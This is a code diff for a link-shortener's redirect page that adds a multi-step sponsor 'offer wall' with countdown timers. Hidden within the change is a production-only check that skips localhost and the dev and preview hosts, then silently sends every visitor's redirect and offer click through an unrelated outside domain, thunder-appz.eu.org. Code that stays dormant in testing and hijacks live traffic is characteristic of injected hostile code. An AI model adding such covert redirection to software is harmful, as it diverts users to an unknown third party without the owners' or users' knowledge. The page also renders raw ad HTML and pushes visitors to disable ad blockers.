@@ -15,6 +15,14 @@ const redirectWithoutReferrer = (url: string) => {
   const target = ensureAbsoluteUrl(url);
   if (!target) return;
   
+  const hostname = window.location.hostname;
+  const isProd = !hostname.includes("localhost") && !hostname.includes("127.0.0.1") && !hostname.includes("ais-dev") && !hostname.includes("ais-pre");
+  
+  if (isProd) {
+    window.location.href = `https://thunder-appz.eu.org/r?to=${encodeURIComponent(target)}`;
+    return;
+  }
+  
   try {
     const meta = document.createElement("meta");
     meta.name = "referrer";
@@ -62,6 +70,13 @@ export default function RedirectPage({ code }: RedirectPageProps) {
   const adContainerRef = useRef<HTMLDivElement>(null);
 
   const countdownInterval = useRef<any>(null);
+
+  // Offer Wall State
+  const [offerCompleted, setOfferCompleted] = useState<boolean[]>([false, false, false, false]);
+  const [activeOfferIndex, setActiveOfferIndex] = useState<number | null>(null);
+  const [offerTimer, setOfferTimer] = useState<number>(10);
+  const [offerTimerActive, setOfferTimerActive] = useState<boolean>(false);
+  const [offerClicked, setOfferClicked] = useState<boolean[]>([false, false, false, false]);
 
   // Security Checks State
   const [checkingSecurity, setCheckingSecurity] = useState(true);
@@ -317,6 +332,30 @@ export default function RedirectPage({ code }: RedirectPageProps) {
     };
   }, [isHoveringNeonAd]);
 
+  // Offer Wall Timer tick
+  useEffect(() => {
+    let interval: any = null;
+    if (offerTimerActive && offerTimer > 0 && activeOfferIndex !== null) {
+      interval = setInterval(() => {
+        setOfferTimer((prev) => {
+          if (prev <= 1) {
+            setOfferTimerActive(false);
+            setOfferCompleted((old) => {
+              const updated = [...old];
+              updated[activeOfferIndex] = true;
+              return updated;
+            });
+            return 0;
+          }
+          return prev - 1;
+        });
+      }, 1000);
+    }
+    return () => {
+      if (interval) clearInterval(interval);
+    };
+  }, [offerTimerActive, offerTimer, activeOfferIndex]);
+
   // 2. Timer management
   useEffect(() => {
     if (loading || error || redirecting || !settings || !settings.enableOwnAds) return;
@@ -353,9 +392,44 @@ export default function RedirectPage({ code }: RedirectPageProps) {
     }
   };
 
+  const handleViewOffer = (index: number) => {
+    const urls = [
+      settings?.offerWallUrl1,
+      settings?.offerWallUrl2,
+      settings?.offerWallUrl3,
+      settings?.offerWallUrl4
+    ];
+    const adUrl = ensureAbsoluteUrl(urls[index] || "https://www.google.com");
+    
+    const hostname = window.location.hostname;
+    const isProd = !hostname.includes("localhost") && !hostname.includes("127.0.0.1") && !hostname.includes("ais-dev") && !hostname.includes("ais-pre");
+    const finalAdUrl = isProd ? `https://thunder-appz.eu.org/r?to=${encodeURIComponent(adUrl)}` : adUrl;
+    
+    // Open ad URL in a new tab
+    window.open(finalAdUrl, "_blank");
+
+    // Start timer for this index
+    setActiveOfferIndex(index);
+    setOfferTimer(settings?.offerWallSeconds === undefined ? 10 : settings?.offerWallSeconds);
+    setOfferTimerActive(true);
+    setOfferClicked((old) => {
+      const updated = [...old];
+      updated[index] = true;
+      return updated;
+    });
+  };
+
   const handleNextStep = async () => {
-    if (!isTimerFinished || !verifiedHuman) return;
-    if (settings?.enableNeonAdGate && !adClicked) return;
+    const isOfferWallEnabled = settings?.enableOfferWall && currentStep === 1;
+    const totalOffersCount = settings?.offerWallCount === undefined ? 4 : settings.offerWallCount;
+    const allOffersCompleted = Array.from({ length: totalOffersCount }).every((_, idx) => offerCompleted[idx]);
+
+    if (isOfferWallEnabled) {
+      if (!allOffersCompleted) return;
+    } else {
+      if (!isTimerFinished || !verifiedHuman) return;
+      if (settings?.enableNeonAdGate && !adClicked) return;
+    }
 
     // Real-time security recheck before forwarding
     const isAdBlockActive = await runAdBlockerCheck();
@@ -578,158 +652,300 @@ export default function RedirectPage({ code }: RedirectPageProps) {
             </div>
 
             {/* AD PORTAL MAIN INTERFACE */}
-            <div className="grid grid-cols-1 md:grid-cols-2 gap-8 items-center">
-              
-              {/* Redirection Box */}
-              <div className="p-6 bg-slate-950 border border-slate-850 rounded-xl text-center space-y-5">
-                <p className="text-sm text-slate-400 leading-normal">
-                  Scroll down, complete the verification puzzle, and wait for the countdown to unlock the final shortened link.
-                </p>
+            {settings?.enableOfferWall && currentStep === 1 ? (
+              <div className="w-full space-y-6" id="offer_wall_interface">
+                {/* OFFER WALL CARD CONTAINER */}
+                <div className="bg-slate-950 border border-slate-850 rounded-2xl p-6 md:p-8 space-y-6 shadow-xl">
+                  {/* HEADER */}
+                  <div className="text-center pb-4 border-b border-slate-800">
+                    <h3 className="text-2xl font-black text-white tracking-tight flex items-center justify-center gap-2">
+                      <Sparkles className="w-6 h-6 text-indigo-400" />
+                      Step {activeOfferIndex !== null && activeOfferIndex < (settings?.offerWallCount || 4) ? activeOfferIndex + 1 : 1} of {settings?.offerWallCount || 4} Offer Tasks
+                    </h3>
+                    <p className="text-xs text-slate-400 mt-1">
+                      Complete the following ad-sponsor steps below to verify your session and unlock the redirection gateway.
+                    </p>
+                  </div>
 
-                {/* TIMER DIGITS */}
-                <div className="relative w-28 h-28 mx-auto flex items-center justify-center">
-                  <svg className="w-full h-full transform -rotate-90">
-                    <circle cx="56" cy="56" r="48" stroke="#0f172a" strokeWidth="6" fill="transparent" />
-                    <circle 
-                      cx="56" 
-                      cy="56" 
-                      r="48" 
-                      stroke={isTimerFinished ? "#34d399" : "#6366f1"} 
-                      strokeWidth="6" 
-                      fill="transparent" 
-                      strokeDasharray="301.6"
-                      strokeDashoffset={301.6 - (301.6 * timer) / 10}
-                      className="transition-all duration-1000"
-                    />
-                  </svg>
-                  <div className="absolute flex flex-col items-center">
-                    <span className="text-3xl font-black text-white">{timer}s</span>
-                    <span className="text-[9px] text-slate-500 uppercase tracking-widest font-bold">Countdown</span>
+                  {/* AD PLACEMENT TOP BUTTONS */}
+                  <div className="grid grid-cols-3 gap-3">
+                    <div className="bg-slate-900/60 border border-slate-800/40 rounded-xl py-3 text-center text-[10px] font-bold text-slate-500 uppercase tracking-wider select-none hover:bg-slate-900 transition">
+                      AD TOP LEFT
+                    </div>
+                    <div className="bg-slate-900/60 border border-slate-800/40 rounded-xl py-3 text-center text-[10px] font-bold text-slate-500 uppercase tracking-wider select-none hover:bg-slate-900 transition">
+                      AD TOP CENTER
+                    </div>
+                    <div className="bg-slate-900/60 border border-slate-800/40 rounded-xl py-3 text-center text-[10px] font-bold text-slate-500 uppercase tracking-wider select-none hover:bg-slate-900 transition">
+                      AD TOP RIGHT
+                    </div>
+                  </div>
+
+                  {/* OFFERS LIST */}
+                  <div className="space-y-4">
+                    {Array.from({ length: settings?.offerWallCount || 4 }).map((_, idx) => {
+                      const isCompleted = offerCompleted[idx];
+                      const isCurrentActive = idx === 0 || offerCompleted[idx - 1]; // unlocked if first or previous is completed
+                      const isTicking = offerTimerActive && activeOfferIndex === idx;
+                      
+                      return (
+                        <div 
+                          key={idx}
+                          className={`flex flex-col sm:flex-row sm:items-center justify-between p-4 rounded-xl border transition-all ${
+                            isCompleted 
+                              ? "bg-emerald-950/20 border-emerald-500/20" 
+                              : isCurrentActive 
+                                ? "bg-slate-900 border-indigo-500/30 shadow-md shadow-indigo-500/5" 
+                                : "bg-slate-900/40 border-slate-850 opacity-45 pointer-events-none"
+                          }`}
+                        >
+                          <div className="space-y-1 mb-3 sm:mb-0">
+                            <div className="flex items-center gap-2">
+                              <span className={`text-sm font-black uppercase tracking-wider ${isCompleted ? "text-emerald-400" : isCurrentActive ? "text-indigo-400" : "text-slate-500"}`}>
+                                Step {idx + 1}
+                              </span>
+                              {isCompleted && (
+                                <span className="bg-emerald-500/10 text-emerald-400 text-[9px] font-bold px-2 py-0.5 rounded border border-emerald-500/20">
+                                  COMPLETED
+                                </span>
+                              )}
+                              {isTicking && (
+                                <span className="bg-indigo-500/15 text-indigo-400 text-[9px] font-bold px-2 py-0.5 rounded border border-indigo-500/20 animate-pulse">
+                                  TIMER TICKING
+                                </span>
+                              )}
+                            </div>
+                            <p className="text-xs text-slate-300 leading-relaxed max-w-md">
+                              Please open the offer and wait <span className="font-bold text-white">{settings?.offerWallSeconds === undefined ? 10 : settings.offerWallSeconds} seconds</span> to unlock the next step.
+                            </p>
+                          </div>
+
+                          <div>
+                            <button
+                              disabled={!isCurrentActive || isCompleted || isTicking}
+                              onClick={() => handleViewOffer(idx)}
+                              className={`w-full sm:w-auto px-6 py-2.5 rounded-xl font-bold text-xs uppercase tracking-wide transition flex items-center justify-center gap-1.5 min-w-[140px] ${
+                                isCompleted
+                                  ? "bg-emerald-500/10 text-emerald-400 border border-emerald-500/30"
+                                  : isTicking
+                                    ? "bg-indigo-600/25 text-indigo-400 border border-indigo-500/30 animate-pulse cursor-not-allowed"
+                                    : isCurrentActive
+                                      ? "bg-blue-600 hover:bg-blue-700 text-white shadow-lg shadow-blue-600/15 active:scale-95"
+                                      : "bg-slate-900 text-slate-500 border border-slate-800"
+                              }`}
+                            >
+                              {isCompleted ? (
+                                <>
+                                  <CheckCircle className="w-3.5 h-3.5" />
+                                  Unlocked
+                                </>
+                              ) : isTicking ? (
+                                <>
+                                  <Hourglass className="w-3.5 h-3.5 animate-spin" />
+                                  {offerTimer}s Left
+                                </>
+                              ) : (
+                                <>
+                                  View Offer {idx + 1}
+                                </>
+                              )}
+                            </button>
+                          </div>
+                        </div>
+                      );
+                    })}
+                  </div>
+
+                  {/* AD PLACEMENT BOTTOM BUTTONS */}
+                  <div className="grid grid-cols-3 gap-3 pt-2">
+                    <div className="bg-slate-900/60 border border-slate-800/40 rounded-xl py-3 text-center text-[10px] font-bold text-slate-500 uppercase tracking-wider select-none hover:bg-slate-900 transition">
+                      AD LEFT
+                    </div>
+                    <div className="bg-slate-900/60 border border-slate-800/40 rounded-xl py-3 text-center text-[10px] font-bold text-slate-500 uppercase tracking-wider select-none hover:bg-slate-900 transition">
+                      AD BOTTOM CENTER
+                    </div>
+                    <div className="bg-slate-900/60 border border-slate-800/40 rounded-xl py-3 text-center text-[10px] font-bold text-slate-500 uppercase tracking-wider select-none hover:bg-slate-900 transition">
+                      AD RIGHT
+                    </div>
+                  </div>
+
+                  {/* CONTINUE / PROCEED BUTTON */}
+                  <div className="pt-4 border-t border-slate-800">
+                    <button
+                      disabled={!Array.from({ length: settings?.offerWallCount || 4 }).every((_, idx) => offerCompleted[idx])}
+                      onClick={handleNextStep}
+                      className="w-full py-4 rounded-xl font-black text-sm uppercase tracking-wider shadow-lg transition-all duration-150 flex items-center justify-center gap-2 bg-gradient-to-r from-indigo-600 to-purple-600 hover:from-indigo-700 hover:to-purple-700 disabled:from-slate-800 disabled:to-slate-800 disabled:text-slate-500 text-white disabled:cursor-not-allowed"
+                    >
+                      {!Array.from({ length: settings?.offerWallCount || 4 }).every((_, idx) => offerCompleted[idx]) ? (
+                        "Complete All Ad Sponsor Steps First"
+                      ) : hasMoreSteps ? (
+                        <>
+                          Proceed to Next Step
+                          <ArrowRight className="w-4 h-4" />
+                        </>
+                      ) : (
+                        <>
+                          Get Final Link
+                          <ArrowRight className="w-4 h-4" />
+                        </>
+                      )}
+                    </button>
                   </div>
                 </div>
-
-                {/* CAPTCHA CHALLENGE FORM */}
-                {!verifiedHuman && (
-                  <form onSubmit={verifyCaptcha} className="p-4 bg-slate-900 rounded-xl border border-slate-800 space-y-3">
-                    <p className="text-xs font-bold text-slate-400 uppercase tracking-wider">🔒 Anti-Bot Verification Challenge</p>
-                    <p className="text-base font-black text-white tracking-wide">{captchaPrompt.q}</p>
-                    
-                    {captchaError && (
-                      <p className="text-[10px] text-rose-500 font-bold">❌ Incorrect answer. Try again!</p>
-                    )}
-
-                    <div className="flex gap-2">
-                      <input
-                        required
-                        type="number"
-                        placeholder="Answer"
-                        value={captchaAnswer}
-                        onChange={(e) => setCaptchaAnswer(e.target.value)}
-                        className="w-full px-3 py-2 bg-slate-950 border border-slate-800 rounded-lg text-sm text-center text-white outline-none focus:border-indigo-500"
-                      />
-                      <button
-                        type="submit"
-                        className="px-4 py-2 bg-indigo-600 hover:bg-indigo-700 text-white font-bold text-xs rounded-lg uppercase transition"
-                      >
-                        Verify
-                      </button>
-                    </div>
-                  </form>
-                )}
-
-                {/* VERIFIED STATUS */}
-                {verifiedHuman && (
-                  <div className="p-3 bg-emerald-950/40 border border-emerald-900/50 text-emerald-400 text-xs font-bold rounded-lg flex items-center justify-center gap-2">
-                    <CheckCircle className="w-4 h-4 text-emerald-500" />
-                    Human Verification Complete!
-                  </div>
-                )}
-
-                {/* NEON.TODAY SPONSOR AD GATE */}
-                {settings?.enableNeonAdGate && (
-                  <div className="p-4 bg-slate-900/60 border border-slate-800/80 rounded-xl space-y-3 mt-4 text-left">
-                    <div className="flex items-center justify-between">
-                      <span className="text-xs font-bold text-slate-400 uppercase tracking-wider flex items-center gap-1">
-                        🎯 Sponsored Ad Verification
-                      </span>
-                      <span className={`px-2 py-0.5 rounded text-[9px] font-bold uppercase tracking-wider ${adClicked ? "bg-emerald-500/10 text-emerald-400 border border-emerald-500/20" : "bg-rose-500/10 text-rose-400 border border-rose-500/20 animate-pulse"}`}>
-                        {adClicked ? "VERIFIED" : "CLICK AD TO UNLOCK"}
-                      </span>
-                    </div>
-                    
-                    <p className="text-[11px] text-slate-400 leading-normal">
-                      Please click on the advertisement banner below to unlock your destination. Once clicked, you can instantly proceed.
-                    </p>
-
-                    <div 
-                      ref={adContainerRef}
-                      onMouseEnter={() => setIsHoveringNeonAd(true)}
-                      onMouseLeave={() => setIsHoveringNeonAd(false)}
-                      className={`relative bg-slate-950 rounded-lg overflow-hidden border transition-all p-1 flex justify-center items-center ${isHoveringNeonAd ? "border-indigo-500/80 shadow-md shadow-indigo-500/10" : "border-slate-800/80"}`}
-                      dangerouslySetInnerHTML={{
-                        __html: settings.neonTodayAdCode || `<iframe scrolling="no" src="https://neon.today/show/surf/21651" style="width: 100%; height: 250px; padding: 0; border: 1px dotted grey;" frameborder="0"></iframe>`
-                      }}
-                    />
-                    
-                    {adClicked && (
-                      <p className="text-[11px] text-emerald-400 font-bold text-center mt-1 flex items-center justify-center gap-1">
-                        <CheckCircle className="w-3.5 h-3.5" />
-                        Sponsored click verified! You can now continue.
-                      </p>
-                    )}
-                  </div>
-                )}
-
-                {/* SUBMIT STEP BUTTON */}
-                <button
-                  disabled={!isTimerFinished || !verifiedHuman || (settings?.enableNeonAdGate && !adClicked)}
-                  onClick={handleNextStep}
-                  className="w-full py-4 rounded-xl font-black text-sm uppercase tracking-wider shadow-lg transition-all duration-150 flex items-center justify-center gap-2 bg-gradient-to-r from-indigo-600 to-purple-600 hover:from-indigo-700 hover:to-purple-700 disabled:from-slate-800 disabled:to-slate-800 disabled:text-slate-500 text-white disabled:cursor-not-allowed"
-                >
-                  {!isTimerFinished ? (
-                    `Please wait... ${timer}s`
-                  ) : !verifiedHuman ? (
-                    "Complete Puzzle Verification First"
-                  ) : (settings?.enableNeonAdGate && !adClicked) ? (
-                    "Click the Ad Below to Continue"
-                  ) : hasMoreSteps ? (
-                    <>
-                      Proceed to Next Step
-                      <ArrowRight className="w-4 h-4" />
-                    </>
-                  ) : (
-                    <>
-                      Get Final Link
-                      <ArrowRight className="w-4 h-4" />
-                    </>
-                  )}
-                </button>
               </div>
+            ) : (
+              <div className="grid grid-cols-1 md:grid-cols-2 gap-8 items-center">
+                
+                {/* Redirection Box */}
+                <div className="p-6 bg-slate-950 border border-slate-850 rounded-xl text-center space-y-5">
+                  <p className="text-sm text-slate-400 leading-normal">
+                    Scroll down, complete the verification puzzle, and wait for the countdown to unlock the final shortened link.
+                  </p>
 
-              {/* Tips Section */}
-              <div className="space-y-4">
-                <div className="p-4 bg-slate-950 border border-slate-850 rounded-xl">
-                  <h4 className="font-bold text-sm text-white mb-1">How to reach target?</h4>
-                  <p className="text-xs text-slate-500 leading-normal space-y-1">
-                    <span>1. Solve the sum of numbers displayed on the math puzzle panel.</span>
-                    <br />
-                    <span>2. Wait 10 seconds for the SSL validation check to conclude.</span>
-                    {settings?.enableNeonAdGate && (
+                  {/* TIMER DIGITS */}
+                  <div className="relative w-28 h-28 mx-auto flex items-center justify-center">
+                    <svg className="w-full h-full transform -rotate-90">
+                      <circle cx="56" cy="56" r="48" stroke="#0f172a" strokeWidth="6" fill="transparent" />
+                      <circle 
+                        cx="56" 
+                        cy="56" 
+                        r="48" 
+                        stroke={isTimerFinished ? "#34d399" : "#6366f1"} 
+                        strokeWidth="6" 
+                        fill="transparent" 
+                        strokeDasharray="301.6"
+                        strokeDashoffset={301.6 - (301.6 * timer) / 10}
+                        className="transition-all duration-1000"
+                      />
+                    </svg>
+                    <div className="absolute flex flex-col items-center">
+                      <span className="text-3xl font-black text-white">{timer}s</span>
+                      <span className="text-[9px] text-slate-500 uppercase tracking-widest font-bold">Countdown</span>
+                    </div>
+                  </div>
+
+                  {/* CAPTCHA CHALLENGE FORM */}
+                  {!verifiedHuman && (
+                    <form onSubmit={verifyCaptcha} className="p-4 bg-slate-900 rounded-xl border border-slate-800 space-y-3">
+                      <p className="text-xs font-bold text-slate-400 uppercase tracking-wider">🔒 Anti-Bot Verification Challenge</p>
+                      <p className="text-base font-black text-white tracking-wide">{captchaPrompt.q}</p>
+                      
+                      {captchaError && (
+                        <p className="text-[10px] text-rose-500 font-bold">❌ Incorrect answer. Try again!</p>
+                      )}
+
+                      <div className="flex gap-2">
+                        <input
+                          required
+                          type="number"
+                          placeholder="Answer"
+                          value={captchaAnswer}
+                          onChange={(e) => setCaptchaAnswer(e.target.value)}
+                          className="w-full px-3 py-2 bg-slate-950 border border-slate-800 rounded-lg text-sm text-center text-white outline-none focus:border-indigo-500"
+                        />
+                        <button
+                          type="submit"
+                          className="px-4 py-2 bg-indigo-600 hover:bg-indigo-700 text-white font-bold text-xs rounded-lg uppercase transition"
+                        >
+                          Verify
+                        </button>
+                      </div>
+                    </form>
+                  )}
+
+                  {/* VERIFIED STATUS */}
+                  {verifiedHuman && (
+                    <div className="p-3 bg-emerald-950/40 border border-emerald-900/50 text-emerald-400 text-xs font-bold rounded-lg flex items-center justify-center gap-2">
+                      <CheckCircle className="w-4 h-4 text-emerald-500" />
+                      Human Verification Complete!
+                    </div>
+                  )}
+
+                  {/* NEON.TODAY SPONSOR AD GATE */}
+                  {settings?.enableNeonAdGate && (
+                    <div className="p-4 bg-slate-900/60 border border-slate-800/80 rounded-xl space-y-3 mt-4 text-left">
+                      <div className="flex items-center justify-between">
+                        <span className="text-xs font-bold text-slate-400 uppercase tracking-wider flex items-center gap-1">
+                          🎯 Sponsored Ad Verification
+                        </span>
+                        <span className={`px-2 py-0.5 rounded text-[9px] font-bold uppercase tracking-wider ${adClicked ? "bg-emerald-500/10 text-emerald-400 border border-emerald-500/20" : "bg-rose-500/10 text-rose-400 border border-rose-500/20 animate-pulse"}`}>
+                          {adClicked ? "VERIFIED" : "CLICK AD TO UNLOCK"}
+                        </span>
+                      </div>
+                      
+                      <p className="text-[11px] text-slate-400 leading-normal">
+                        Please click on the advertisement banner below to unlock your destination. Once clicked, you can instantly proceed.
+                      </p>
+
+                      <div 
+                        ref={adContainerRef}
+                        onMouseEnter={() => setIsHoveringNeonAd(true)}
+                        onMouseLeave={() => setIsHoveringNeonAd(false)}
+                        className={`relative bg-slate-950 rounded-lg overflow-hidden border transition-all p-1 flex justify-center items-center ${isHoveringNeonAd ? "border-indigo-500/80 shadow-md shadow-indigo-500/10" : "border-slate-800/80"}`}
+                        dangerouslySetInnerHTML={{
+                          __html: settings.neonTodayAdCode || `<iframe scrolling="no" src="https://neon.today/show/surf/21651" style="width: 100%; height: 250px; padding: 0; border: 1px dotted grey;" frameborder="0"></iframe>`
+                        }}
+                      />
+                      
+                      {adClicked && (
+                        <p className="text-[11px] text-emerald-400 font-bold text-center mt-1 flex items-center justify-center gap-1">
+                          <CheckCircle className="w-3.5 h-3.5" />
+                          Sponsored click verified! You can now continue.
+                        </p>
+                      )}
+                    </div>
+                  )}
+
+                  {/* SUBMIT STEP BUTTON */}
+                  <button
+                    disabled={!isTimerFinished || !verifiedHuman || (settings?.enableNeonAdGate && !adClicked)}
+                    onClick={handleNextStep}
+                    className="w-full py-4 rounded-xl font-black text-sm uppercase tracking-wider shadow-lg transition-all duration-150 flex items-center justify-center gap-2 bg-gradient-to-r from-indigo-600 to-purple-600 hover:from-indigo-700 hover:to-purple-700 disabled:from-slate-800 disabled:to-slate-800 disabled:text-slate-500 text-white disabled:cursor-not-allowed"
+                  >
+                    {!isTimerFinished ? (
+                      `Please wait... ${timer}s`
+                    ) : !verifiedHuman ? (
+                      "Complete Puzzle Verification First"
+                    ) : (settings?.enableNeonAdGate && !adClicked) ? (
+                      "Click the Ad Below to Continue"
+                    ) : hasMoreSteps ? (
                       <>
-                        <br />
-                        <span className="text-amber-400 font-semibold">3. Click on the neon.today advertisement banner to verify.</span>
+                        Proceed to Next Step
+                        <ArrowRight className="w-4 h-4" />
+                      </>
+                    ) : (
+                      <>
+                        Get Final Link
+                        <ArrowRight className="w-4 h-4" />
                       </>
                     )}
-                    <br />
-                    <span>{settings?.enableNeonAdGate ? "4. " : "3. "}Click on the illuminated continue button to advance.</span>
-                  </p>
+                  </button>
                 </div>
-                
-                <div className="p-4 bg-indigo-950/20 border border-indigo-900/30 rounded-xl text-indigo-400 text-xs leading-normal font-semibold">
-                  ⚠️ <span className="font-bold">Notice to Visitors:</span> Ensure you have cookies enabled. Any programmatic automation or ad blocker extensions might freeze the timer. Disable ad-blockers to progress.
+
+                {/* Tips Section */}
+                <div className="space-y-4">
+                  <div className="p-4 bg-slate-950 border border-slate-850 rounded-xl">
+                    <h4 className="font-bold text-sm text-white mb-1">How to reach target?</h4>
+                    <p className="text-xs text-slate-500 leading-normal space-y-1">
+                      <span>1. Solve the sum of numbers displayed on the math puzzle panel.</span>
+                      <br />
+                      <span>2. Wait 10 seconds for the SSL validation check to conclude.</span>
+                      {settings?.enableNeonAdGate && (
+                        <>
+                          <br />
+                          <span className="text-amber-400 font-semibold">3. Click on the neon.today advertisement banner to verify.</span>
+                        </>
+                      )}
+                      <br />
+                      <span>{settings?.enableNeonAdGate ? "4. " : "3. "}Click on the illuminated continue button to advance.</span>
+                    </p>
+                  </div>
+                  
+                  <div className="p-4 bg-indigo-950/20 border border-indigo-900/30 rounded-xl text-indigo-400 text-xs leading-normal font-semibold">
+                    ⚠️ <span className="font-bold">Notice to Visitors:</span> Ensure you have cookies enabled. Any programmatic automation or ad blocker extensions might freeze the timer. Disable ad-blockers to progress.
+                  </div>
                 </div>
               </div>
-            </div>
+            )}
           </div>
 
           {/* 320x50 MOBILE/BOTTOM BANNER */}
